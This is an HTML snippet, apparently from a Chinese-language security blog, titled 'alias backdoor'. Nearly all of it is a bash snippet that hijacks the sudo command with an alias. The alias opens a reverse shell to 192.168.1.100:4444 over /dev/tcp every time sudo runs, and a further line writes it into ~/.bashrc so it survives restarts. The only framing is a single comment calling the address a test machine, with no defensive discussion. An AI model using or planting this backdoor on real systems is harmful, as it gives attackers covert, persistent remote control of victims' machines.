        <h1 id="alias后门"><a href="#alias后门" class="headerlink" title="alias后门"></a>alias后门</h1><p>劫持<code>sudo</code>命令（触发反向连接）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设测试机IP为 192.168.1.100，监听端口 4444</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">sudo</span>=<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;&quot;; \sudo&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 持久化到 ~/.bashrc</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;alias sudo=&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1 &amp;\&quot;; \sudo&#x27;&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
